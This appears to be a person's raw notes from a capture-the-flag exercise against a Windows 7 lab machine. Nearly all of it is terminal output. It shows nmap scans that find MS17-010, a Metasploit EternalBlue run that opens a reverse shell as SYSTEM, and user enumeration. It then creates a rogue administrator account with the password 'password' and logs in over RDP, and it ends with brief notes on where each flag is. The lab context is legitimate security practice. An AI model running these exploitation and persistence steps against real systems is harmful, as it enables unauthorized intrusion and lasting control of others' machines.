# nmap
```
oot@kali:~# nmap -sV -sC -T5 -p- 10.10.6.152
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 14:01 UTC
Nmap scan report for ip-10-10-6-152.eu-west-1.compute.internal (10.10.6.152)
Host is up (0.00085s latency).
Not shown: 65524 closed ports
PORT      STATE SERVICE     VERSION
135/tcp   open  msrpc       Microsoft Windows RPC
139/tcp   open  netbios-ssn Windows 7 Professional 7601 Service Pack 1 netbios-ssn
5357/tcp  open  http        Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
5938/tcp  open  teamviewer?
9001/tcp  open  tor-orport?
| fingerprint-strings:
|   GenericLines, GetRequest, NULL, SSLSessionReq:
|_    Send me an IP address, you never know who might *respond*
49152/tcp open  msrpc       Microsoft Windows RPC
49153/tcp open  msrpc       Microsoft Windows RPC
49154/tcp open  msrpc       Microsoft Windows RPC
49155/tcp open  msrpc       Microsoft Windows RPC
49161/tcp open  msrpc       Microsoft Windows RPC
49162/tcp open  msrpc       Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9001-TCP:V=7.80%I=7%D=7/26%Time=5F1D8CD7%P=x86_64-pc-linux-gnu%r(NU
SF:LL,3A,"Send\x20me\x20an\x20IP\x20address,\x20you\x20never\x20know\x20wh
SF:o\x20might\x20\*respond\*\n")%r(GenericLines,3A,"Send\x20me\x20an\x20IP
SF:\x20address,\x20you\x20never\x20know\x20who\x20might\x20\*respond\*\n")
SF:%r(GetRequest,3A,"Send\x20me\x20an\x20IP\x20address,\x20you\x20never\x2
SF:0know\x20who\x20might\x20\*respond\*\n")%r(SSLSessionReq,3A,"Send\x20me
SF:\x20an\x20IP\x20address,\x20you\x20never\x20know\x20who\x20might\x20\*r
SF:espond\*\n");
MAC Address: 02:10:5F:01:0E:9A (Unknown)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -19m59s, deviation: 34m38s, median: 0s
|_nbstat: NetBIOS name: PEPEGAENERGY-01, NetBIOS user: <unknown>, NetBIOS MAC: 02:10:5f:01:0e:9a (unknown)
| smb-os-discovery:
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: PepegaEnergy-01
|   NetBIOS computer name: PEPEGAENERGY-01\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-07-26T15:02:52+01:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2020-07-26T14:02:52
|_  start_date: 2020-07-26T14:01:26

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.64 seconds

```


```
root@kali:~# nmap --script smb-vuln* -p 445  10.10.6.152
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 14:14 UTC
Nmap scan report for ip-10-10-6-152.eu-west-1.compute.internal (10.10.6.152)
Host is up (0.00014s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 02:10:5F:01:0E:9A (Unknown)

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

Nmap done: 1 IP address (1 host up) scanned in 5.53 s
```


```
root@kali:~# msfconsole
[-] ***rting the Metasploit Framework console.../
[-] * WARNING: No database support: No database YAML file
[-] ***


     .~+P``````-o+:.                                      -o+:.
.+oooyysyyssyyssyddh++os-`````                        ```````````````          `
+++++++++++++++++++++++sydhyoyso/:.````...`...-///::+ohhyosyyosyy/+om++:ooo///o
++++///////~~~~///////++++++++++++++++ooyysoyysosso+++++++++++++++++++///oossosy
--.`                 .-.-...-////+++++++++++++++////////~~//////++++++++++++///
                                `...............`              `...-/////...`


                                  .::::::::::-.                     .::::::-
                                .hmMMMMMMMMMMNddds\...//M\\.../hddddmMMMMMMNo
                                 :Nm-/NMMMMMMMMMMMMM$$NMMMMm&&MMMMMMMMMMMMMMy
                                 .sm/`-yMMMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMMMh`
                                  -Nd`  :MMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMMh`
                                   -Nh` .yMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMm/
    `oo/``-hd:  ``                 .sNd  :MMMMMMMMMM$$MMMMMN&&MMMMMMMMMMm/
      .yNmMMh//+syysso-``````       -mh` :MMMMMMMMMM$$MMMMMN&&MMMMMMMMMMd
    .shMMMMN//dmNMMMMMMMMMMMMs`     `:```-o++++oooo+:/ooooo+:+o+++oooo++/
    `///omh//dMMMMMMMMMMMMMMMN/:::::/+ooso--/ydh//+s+/ossssso:--syN///os:
          /MMMMMMMMMMMMMMMMMMd.     `/++-.-yy/...osydh/-+oo:-`o//...oyodh+
          -hMMmssddd+:dMMmNMMh.     `.-=mmk.//^^^\\.^^`:++:^^o://^^^\\`::
          .sMMmo.    -dMd--:mN/`           ||--X--||          ||--X--||
........../yddy/:...+hmo-...hdd:............\\=v=//............\\=v=//.........
================================================================================
=====================+--------------------------------+=========================
=====================| Session one died of dysentery. |=========================
=====================+--------------------------------+=========================
================================================================================

                     Press ENTER to size up the situation

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%% Date: April 25, 1848 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%% Weather: It's always cool in the lab %%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%% Health: Overweight %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%% Caffeine: 12975 mg %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%% Hacked: All the things %%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

                        Press SPACE BAR to continue



       =[ metasploit v5.0.71-dev                          ]
+ -- --=[ 1962 exploits - 1095 auxiliary - 336 post       ]
+ -- --=[ 558 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

msf5 > search ms17-010

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   2  exploit/windows/smb/doublepulsar_rce           2017-04-14       great    Yes    DOUBLEPULSAR Payload Execution and Neutralization
   3  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   4  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   5  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution


msf5 > use 3
msf5 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs


msf5 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.6.152
RHOSTS => 10.10.6.152
msf5 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.10.133.8:4444
[*] 10.10.6.152:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.6.152:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.6.152:445       - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.6.152:445 - Connecting to target for exploitation.
[+] 10.10.6.152:445 - Connection established for exploitation.
[+] 10.10.6.152:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.6.152:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.6.152:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.6.152:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.6.152:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1
[+] 10.10.6.152:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.6.152:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.6.152:445 - Sending all but last fragment of exploit packet
[*] 10.10.6.152:445 - Starting non-paged pool grooming
[+] 10.10.6.152:445 - Sending SMBv2 buffers
[+] 10.10.6.152:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.6.152:445 - Sending final SMBv2 buffers.
[*] 10.10.6.152:445 - Sending last fragment of exploit packet!
[*] 10.10.6.152:445 - Receiving response from exploit packet
[+] 10.10.6.152:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.6.152:445 - Sending egg to corrupted connection.
[*] 10.10.6.152:445 - Triggering free of corrupted buffer.
[*] Command shell session 1 opened (10.10.133.8:4444 -> 10.10.6.152:49194) at 2020-07-26 14:18:23 +0000
[+] 10.10.6.152:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.6.152:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.6.152:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

ls
ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

C:\Windows\system32>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is D40E-2F3D

 Directory of C:\Windows\system32

07/26/2020  03:05 PM    <DIR>          .
0
```

```
C:\Windows\system32>whoami
whoami
nt authority\system
```

```
C:\Users\Timmy\Desktop>net users
net users

User accounts for \\

-------------------------------------------------------------------------------
Administrator            Guest                    Timmy
Zachary
The command completed with one or more errors.


C:\Users\Timmy\Desktop>net user timmy
net user timmy
User name                    Timmy
Full Name                    Timmy
Comment
User's comment
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/4/2020 9:52:07 PM
Password expires             Never
Password changeable          2/4/2020 9:52:07 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   7/26/2020 3:00:37 PM

Logon hours allowed          All

Local Group Memberships      *Remote Desktop Users *Users
Global Group memberships     *None
The command completed successfully.


C:\Users\Tim
```

# add own user
```
C:\Users\Timmy\Desktop>net user shunaroo password /add
net user shunaroo password /add
The command completed successfully.

C:\Users\Timmy\Desktop>net localgroup "Remote Desktop Users" shunaroo /add
net localgroup "Remote Desktop Users" shunaroo /add
The command completed successfully.


C:\Users\Timmy\Desktop>net localgroup "Administrators" shunaroo /add
net localgroup "Administrators" shunaroo /add
The command completed successfully.


C:\Users\Timmy\Desktop>
```

```
xfreerdp /u:shunaroo /p:password /v:10.10.6.152

show hidden file 

```


# 1
- timmy desktop

# 2 
 
- zachary history
copy roaming

# 3
- timmy history
copy roaming

# 4
- timmy desktop 

# 5
- timmy desktop
- correct spell

# 6
- zachay desktop
- list

# 7
- zachay histroy

# 7
- zachay desktop
- last line
